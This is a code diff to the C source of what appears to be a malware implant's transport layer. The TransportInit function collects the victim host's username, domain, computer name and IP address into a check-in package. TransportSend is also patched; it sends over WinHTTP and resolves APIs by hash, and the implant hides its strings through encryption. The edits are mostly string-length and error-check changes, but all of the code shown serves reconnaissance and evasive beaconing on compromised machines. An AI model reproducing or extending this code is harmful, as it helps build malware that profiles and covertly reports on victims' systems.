@@ -123,7 +123,7 @@ BOOL TransportInit( ) {
         check_debug(p_GetUserNameA(Data, (LPDWORD) &Length) != 0, "GetUserNameA Failed!");
     }
 
-    PackageAddBytes( Package, Data, strlen( Data ) );
+    PackageAddBytes( Package, Data, str_len( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
@@ -140,7 +140,7 @@ BOOL TransportInit( ) {
 
     if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
         if (p_GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
-            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
+            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, str_len( Adapter->IpAddressList.IpAddress.String ) );
 
             mem_set( Adapter, 0, Length );
             LocalFree( Adapter );
@@ -177,7 +177,8 @@ BOOL TransportInit( ) {
     // Get Computer name
     if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
+            check_debug(GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0,
+                        "GetComputerNameExA") ;
     }
 
     PackageAddBytes( Package, Data, Length );
@@ -186,16 +187,17 @@ BOOL TransportInit( ) {
     // Get Username
     Length = MAX_PATH;
     if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
-        GetUserNameA(Data, (LPDWORD) &Length);
+        check_debug(GetUserNameA(Data, (LPDWORD) &Length) !=0, "GetUserNameA Failed!");
     }
 
-    PackageAddBytes( Package, Data, strlen( Data ) );
+    PackageAddBytes( Package, Data, str_len( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
     if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
+            check_debug(GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0,
+                        "GetComputerNameExA Failed!");
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -203,7 +205,7 @@ BOOL TransportInit( ) {
     GetAdaptersInfo(NULL, (PULONG) &Length);
     if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
         if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
-            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
+            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, str_len( Adapter->IpAddressList.IpAddress.String ) );
 
             mem_set( Adapter, 0, Length );
             LocalFree( Adapter );
@@ -269,6 +271,7 @@ BOOL TransportInit( ) {
         DATA_FREE(Data, Length)
     }
 
+#if CONFIG_OBFUSCATION == TRUE
     if(pwcAdvapi32 != NULL){
         int lenWAdvapi32 = lstrlenW(pwcAdvapi32);
         DATA_FREE(pwcAdvapi32,lenWAdvapi32)
@@ -279,12 +282,10 @@ BOOL TransportInit( ) {
         DATA_FREE(pwcIphlpapi,lenWIphlpapi)
     }
 
-
-#if CONFIG_OBFUSCATION == TRUE
     // zero out decrypted strings
-    mem_set(d_kernel32,0x0,strlen(s_kernel32));
-    mem_set(d_advapi32,0x0,strlen(s_advapi32));
-    mem_set(d_iphlpapi,0x0,strlen(s_iphlpapi));
+    mem_set(d_kernel32,0x0,str_len(s_kernel32));
+    mem_set(d_advapi32,0x0,str_len(s_advapi32));
+    mem_set(d_iphlpapi,0x0,str_len(s_iphlpapi));
 #endif
     return Success;
 }
@@ -446,7 +447,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     p_WinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                       WinHttpCloseHandle_CRC32B);
-    mem_set(winhttp,0x0,strlen(s_string));
+    mem_set(winhttp,0x0,str_len(s_string));
     p_WinHttpCloseHandle ( hSession );
     p_WinHttpCloseHandle ( hConnect );
     p_WinHttpCloseHandle ( hRequest );
